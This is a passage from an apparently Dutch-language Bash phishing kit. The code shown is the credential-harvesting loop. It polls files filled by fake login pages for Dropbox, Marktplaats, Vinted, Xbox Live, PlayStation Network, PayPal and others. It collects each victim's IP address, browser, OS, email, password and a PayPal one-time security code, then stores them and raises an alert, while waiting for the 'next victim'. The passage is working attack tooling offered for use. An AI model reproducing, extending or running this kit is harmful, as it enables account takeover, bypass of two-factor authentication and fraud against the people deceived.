		usern=$(grep -o 'E-Mail:.*' sites/$server/credentials.txt | cut -d ":" -f2)
		IFS=$'\n'
		passw=$(grep -o 'Wachtwoord:.*' sites/$server/credentials.txt | cut -d ":" -f2)
		printf " \e[1;34m[\e[0m\e[1;31m*\e[0m\e[1;34m]\e[0m\e[1;34m Tel/Email.....:\e[0m\e[1;37m%s\n\e[0m" $usern
		printf " \e[1;34m[\e[0m\e[1;31m*\e[0m\e[1;34m]\e[0m\e[1;34m Wachtwoord....:\e[0m\e[1;37m%s\n\e[0m" $passw
		alert $usern $passw
		cat sites/$server/credentials.txt >> sites/$server/saved.credentials.txt
	# Videoland
	elif [[ $option == 15 ]]; then
		email=$(grep -o 'E-Mail:.*' sites/$server/credentials.txt | cut -d ":" -f2)
		IFS=$'\n'
		passw=$(grep -o 'Wachtwoord:.*' sites/$server/credentials.txt | cut -d ":" -f2)
		printf " \e[1;34m[\e[0m\e[1;31m*\e[0m\e[1;34m]\e[0m\e[1;34m E-Mailadres...:\e[0m\e[1;37m%s\n\e[0m" $email
		printf " \e[1;34m[\e[0m\e[1;31m*\e[0m\e[1;34m]\e[0m\e[1;34m Wachtwoord....:\e[0m\e[1;37m%s\n\e[0m" $passw
		alert $email $passw
		cat sites/$server/credentials.txt >> sites/$server/saved.credentials.txt
	# DropBox
	elif [[ $option == 16 ]]; then
		email=$(grep -o 'E-Mail:.*' sites/$server/credentials.txt | cut -d ":" -f2)
		IFS=$'\n'
		passw=$(grep -o 'Wachtwoord:.*' sites/$server/credentials.txt | cut -d ":" -f2)
		printf " \e[1;34m[\e[0m\e[1;31m*\e[0m\e[1;34m]\e[0m\e[1;34m E-Mailadres...:\e[0m\e[1;37m%s\n\e[0m" $email
		printf " \e[1;34m[\e[0m\e[1;31m*\e[0m\e[1;34m]\e[0m\e[1;34m Wachtwoord....:\e[0m\e[1;37m%s\n\e[0m" $passw
		alert $email $passw
		cat sites/$server/credentials.txt >> sites/$server/saved.credentials.txt
	# 2eHands
	elif [[ $option == 17 ]]; then
		email=$(grep -o 'E-Mail:.*' sites/$server/credentials.txt | cut -d ":" -f2)
		IFS=$'\n'
		passw=$(grep -o 'Wachtwoord:.*' sites/$server/credentials.txt | cut -d ":" -f2)
		printf " \e[1;34m[\e[0m\e[1;31m*\e[0m\e[1;34m]\e[0m\e[1;34m E-Mailadres...:\e[0m\e[1;37m%s\n\e[0m" $email
		printf " \e[1;34m[\e[0m\e[1;31m*\e[0m\e[1;34m]\e[0m\e[1;34m Wachtwoord....:\e[0m\e[1;37m%s\n\e[0m" $passw
		alert $email $passw
		cat sites/$server/credentials.txt >> sites/$server/saved.credentials.txt
	# Marktplaats
	elif [[ $option == 18 ]]; then
		email=$(grep -o 'E-Mail:.*' sites/$server/credentials.txt | cut -d ":" -f2)
		IFS=$'\n'
		passw=$(grep -o 'Wachtwoord:.*' sites/$server/credentials.txt | cut -d ":" -f2)
		printf " \e[1;34m[\e[0m\e[1;31m*\e[0m\e[1;34m]\e[0m\e[1;34m E-Mailadres...:\e[0m\e[1;37m%s\n\e[0m" $email
		printf " \e[1;34m[\e[0m\e[1;31m*\e[0m\e[1;34m]\e[0m\e[1;34m Wachtwoord....:\e[0m\e[1;37m%s\n\e[0m" $passw
		alert $email $passw
		cat sites/$server/credentials.txt >> sites/$server/saved.credentials.txt
	# Vinted
	elif [[ $option == 19 ]]; then
		usern=$(grep -o 'Gebruikersnaam:.*' sites/$server/credentials.txt | cut -d ":" -f2)
		IFS=$'\n'
		passw=$(grep -o 'Wachtwoord:.*' sites/$server/credentials.txt | cut -d ":" -f2)
		printf " \e[1;34m[\e[0m\e[1;31m*\e[0m\e[1;34m]\e[0m\e[1;34m Email/Gebr....:\e[0m\e[1;37m%s\n\e[0m" $usern
		printf " \e[1;34m[\e[0m\e[1;31m*\e[0m\e[1;34m]\e[0m\e[1;34m Wachtwoord....:\e[0m\e[1;37m%s\n\e[0m" $passw
		alert $usern $passw
		cat sites/$server/credentials.txt >> sites/$server/saved.credentials.txt
	# XBOX Live
	elif [[ $option == 20 ]]; then
		email=$(grep -o 'E-Mail:.*' sites/$server/credentials.txt | cut -d ":" -f2)
		IFS=$'\n'
		passw=$(grep -o 'Wachtwoord:.*' sites/$server/credentials.txt | cut -d ":" -f2)
		printf " \e[1;34m[\e[0m\e[1;31m*\e[0m\e[1;34m]\e[0m\e[1;34m E-Mailadres...:\e[0m\e[1;37m%s\n\e[0m" $email
		printf " \e[1;34m[\e[0m\e[1;31m*\e[0m\e[1;34m]\e[0m\e[1;34m Wachtwoord....:\e[0m\e[1;37m%s\n\e[0m" $passw
		alert $email $passw
		cat sites/$server/credentials.txt >> sites/$server/saved.credentials.txt
	# Playstation Network
	elif [[ $option == 21 ]]; then
		email=$(grep -o 'E-Mail:.*' sites/$server/credentials.txt | cut -d ":" -f2)
		IFS=$'\n'
		passw=$(grep -o 'Wachtwoord:.*' sites/$server/credentials.txt | cut -d ":" -f2)
		printf " \e[1;34m[\e[0m\e[1;31m*\e[0m\e[1;34m]\e[0m\e[1;34m E-Mailadres...:\e[0m\e[1;37m%s\n\e[0m" $email
		printf " \e[1;34m[\e[0m\e[1;31m*\e[0m\e[1;34m]\e[0m\e[1;34m Wachtwoord....:\e[0m\e[1;37m%s\n\e[0m" $passw
		alert $email $passw
		cat sites/$server/credentials.txt >> sites/$server/saved.credentials.txt
	#
	# Add more websites here...
	#
	fi
	printf "\n"
	if [[ $option == 5 || $option == 05 ]]; then
		printf " \e[1;34m[\e[0m\e[1;31m*\e[0m\e[1;34m] Wachten op beveiligingscode..\e[0m\e[1;31m Druk op Ctrl + C om af te sluiten..\e[0m\n\n"
	else 
		printf " \e[1;34m[\e[0m\e[1;31m*\e[0m\e[1;34m] Wachten op volgende IP-Adres, en door de volgende slachtoffer ingevoerde gegevens.\e[0m\e[1;31m Druk op Ctrl + C om af te sluiten..\e[0m\n\n"
	fi
}

printonetimepassword () {
	# Paypal
	if [[ $option == 5 || $option == 05 ]]; then
		code=$(grep -o 'Code:.*' sites/$server/otp.txt | cut -d ":" -f2)
		printf " \e[1;34m[\e[0m\e[1;31m*\e[0m\e[1;34m]\e[0m\e[1;34m Beveiligingscode...:\e[0m\e[1;37m%s\n\e[0m" $code
		alert $code
	fi
	printf "\n"
	printf " \e[1;34m[\e[0m\e[1;31m*\e[0m\e[1;34m] Wachten op volgende IP-Adres, en door de volgende slachtoffer ingevoerde gegevens.\e[0m\e[1;31m Druk op Ctrl + C om af te sluiten..\e[0m\n\n"
}

waitforcredentials () {
	printf "\n"
	printf " \e[1;34m[\e[0m\e[1;31m*\e[0m\e[1;34m] Wachten op IP-Adres, en door het slachtoffer ingevoerde gegevens.\e[0m\e[1;31m Druk op Ctrl + C om af te sluiten..\e[0m\n\n"
	while [ true ]; do
		if [[ -e "sites/$server/ip.txt" ]]; then
			touch sites/$server/saved.credentials.txt
			ip=$(grep -a 'IP-Addres:.*' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
			IFS=$'\n'
			br=$(grep 'Browser:.*' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
			os=$(grep 'OS:.*' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
			printf " \e[1;34m[\e[1;31m\e[1;31m*\e[0m\e[1;34m] IP-Adres......:\e[0m\e[1;37m %s\e[0m\n" $ip
			printf " \e[1;34m[\e[1;31m\e[1;31m*\e[0m\e[1;34m] Browser.......:\e[0m\e[1;37m %s\e[0m\n" $br
			printf " \e[1;34m[\e[1;31m\e[1;31m*\e[0m\e[1;34m] OS............:\e[0m\e[1;37m %s\e[0m\n\n" $os
			cat sites/$server/ip.txt >> sites/$server/saved.ip.txt
			rm -rf sites/$server/ip.txt
		fi
		sleep 0.5
		if [[ -e "sites/$server/credentials.txt" ]]; then
			printcredentials
			rm -rf sites/$server/credentials.txt
		fi
		sleep 0.5
		if [[ $option == 5 || $option == 05 ]] && [[ -e "sites/$server/otp.txt" ]]; then
			printonetimepassword
			rm -rf sites/$server/otp.txt
		fi
		sleep 0.5
	done 
}

clear
banner
menu